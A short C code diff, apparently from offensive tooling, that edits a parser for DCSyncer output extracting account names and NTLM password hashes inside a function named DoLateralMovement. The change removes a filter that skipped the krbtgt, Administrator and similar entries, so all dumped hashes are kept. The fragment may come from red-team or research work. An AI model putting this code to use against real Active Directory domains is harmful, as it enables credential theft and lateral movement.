@@ -47,13 +47,6 @@ KeyValuePair* parseDCSyncerResult(const char* result, int* count) {
                 strcpy(hashNTLM, pos + 2);
                 hashNTLM[strcspn(hashNTLM, "\n")] = 0; // Remove newline character
 
-                // Skip specific object RDN values
-                if (strcmp(currentRDN, "DC") == 0 || strcmp(currentRDN, "WS") == 0 ||
-                    strcmp(currentRDN, "krbtgt") == 0 || strcmp(currentRDN, "Administrator") == 0) {
-                    linePtr = strtok(NULL, "\n");
-                    continue;
-                }
-
                 // Allocate memory for the result array
                 resultArray = realloc(resultArray, (resultCount + 1) * sizeof(KeyValuePair));
                 strcpy(resultArray[resultCount].objectRDN, currentRDN);
@@ -176,6 +169,8 @@ BOOL DoLateralMovement() {
         printf("\n\n");
         free(resultArray);
     }
+
+
 
     free(dcsyncerResult);
     return TRUE;
